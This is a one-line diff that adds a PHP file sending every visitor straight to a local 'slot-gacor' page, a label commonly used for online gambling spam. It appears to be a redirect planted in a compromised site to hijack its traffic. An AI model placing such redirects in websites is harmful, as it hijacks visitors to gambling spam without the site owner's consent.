@@ -1,0 +1,1 @@
+<?php header('Location: /assets/slot-gacor/index.html'); exit(); ?>
